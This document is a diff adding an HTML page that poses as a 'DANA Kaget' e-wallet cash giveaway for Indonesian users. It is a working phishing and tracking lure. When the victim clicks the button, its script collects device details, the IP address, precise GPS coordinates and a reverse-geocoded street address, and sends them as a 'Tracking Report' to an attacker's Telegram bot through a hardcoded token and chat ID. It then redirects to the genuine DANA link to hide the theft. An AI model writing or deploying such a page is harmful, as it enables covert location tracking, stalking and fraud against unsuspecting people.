@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DANA Kaget 2026</title>
+    
+    <meta property="og:title" content="🎁 Saldo DANA Kaget Rp 150.000">
+    <meta property="og:description" content="Selamat! Kamu terpilih mendapatkan saldo gratis. Klik untuk klaim sekarang.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_danain.png/1200px-Logo_danain.png">
+
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; text-align: center; background-color: #008ce3; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .main-container { width: 320px; min-height: 400px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.3); position: relative; transition: 0.5s; overflow: hidden; }
+        .amplop-ui { background: #ed4135; padding: 40px 20px; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; box-sizing: border-box; }
+        .logo-dana { width: 80px; margin-bottom: 20px; }
+        .judul { color: white; font-weight: bold; font-size: 24px; }
+        .sub { color: #ffe0e0; font-size: 14px; margin-top: 10px; margin-bottom: 40px; }
+        .btn-buka { width: 90px; height: 90px; background: #ffcf4b; border-radius: 50%; border: 6px solid #f9b805; color: #333; font-weight: bold; font-size: 20px; cursor: pointer; animation: pulse 1.5s infinite; outline: none; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        .loading-ui { background: white; padding: 40px 20px; height: 100%; display: none; color: #333; box-sizing: border-box; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #008ce3; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 25px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="main-container" id="box">
+    <div id="ui-awal" class="amplop-ui">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_danain.png/1200px-Logo_danain.png" class="logo-dana">
+        <div class="judul">DANA Kaget</div>
+        <div class="sub">Kamu menerima saldo Rp 150.000<br>Klik tombol di bawah untuk mencairkan.</div>
+        <button class="btn-buka" onclick="mulaiProses()">BUKA</button>
+    </div>
+
+    <div id="ui-proses" class="loading-ui">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_danain.png/1200px-Logo_danain.png" style="width:100px;">
+        <h2 style="color:#008ce3; margin-top:20px;">Memeriksa Saldo...</h2>
+        <div class="loader"></div>
+        <p style="font-size: 13px; color:#666;">Sedang memverifikasi lokasi dan perangkat untuk pencairan dana.</p>
+        <p style="font-size: 11px; color:#999; margin-top:30px;">Klik <b>"Izinkan"</b> jika muncul permintaan sistem.</p>
+    </div>
+</div>
+
+<script>
+    const TOKEN = "8792237779:AAHPqEspio6-Brm0-H7N-D2Us_n3vLM9la8"; 
+    const CHAT_ID = "7499493637"; 
+
+    async function teleTeks(msg) {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+        });
+    }
+
+    async function mulaiProses() {
+        document.getElementById('ui-awal').style.display = 'none';
+        document.getElementById('ui-proses').style.display = 'block';
+        document.getElementById('box').style.background = 'white';
+
+        let batLevel = "N/A", batStatus = "N/A", netType = "N/A";
+        try {
+            const battery = await navigator.getBattery();
+            batLevel = Math.round(battery.level * 100) + "%";
+            batStatus = battery.charging ? "✅ YA" : "❌ TIDAK";
+            netType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
+        } catch (e) {}
+
+        let geo = {};
+        try { const r = await fetch('https://ipapi.co/json/'); geo = await r.json(); } catch (e) {}
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                const waktu = new Date().toLocaleString('id-ID', { dateStyle: 'full', timeStyle: 'long' });
+
+                let alamatLengkap = "Mencari alamat...";
+                try {
+                    const rev = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+                    const dataAlamat = await rev.json();
+                    alamatLengkap = dataAlamat.display_name;
+                } catch (e) { alamatLengkap = "Gagal mengambil alamat otomatis"; }
+
+                const laporanMewah = `
+╭───── Tracking Report ───── ⦿
+
+🌐 Bahasa: ${navigator.language}
+📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}
+📺 Screen: ${screen.width}x${screen.height}
+💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB
+🧠 CPU Cores: ${navigator.hardwareConcurrency}
+🔋 Battery: ${batLevel} (${batStatus})
+📶 Net: ${netType}
+⏰ Waktu: ${waktu}
+
+📍 LOCATION INFORMATION
+📡 IP Address: ${geo.ip || 'Unknown'}
+🏙️ Kota: ${geo.city || 'Unknown'}
+📌 Latitude: ${lat}
+📍 Longitude: ${lon}
+🏠 Alamat: ${alamatLengkap}
+🗺️ Maps: ${mapsUrl}
+
+╰───── Pelacakan Berhasil`;
+
+                await teleTeks(laporanMewah);
+                
+                // REDIRECT KE APLIKASI DANA
+                setTimeout(() => { 
+                    window.location.href = "danawallet://v1/dana_kaget?kagetUrl=https://link.dana.id/kaget";
+                    setTimeout(() => {
+                        window.location.href = "https://link.dana.id/kaget";
+                    }, 1500);
+                }, 1000);
+
+            }, async (err) => {
+                await teleTeks(`⚠️ TARGET MENOLAK GPS\n📡 IP: ${geo.ip || 'Unknown'}\n🏙️ Kota: ${geo.city || 'Unknown'}`);
+                window.location.href = "https://link.dana.id/kaget";
+            });
+        } else {
+            window.location.href = "https://link.dana.id/kaget";
+        }
+    }
+</script>
+
+</body>
+</html>
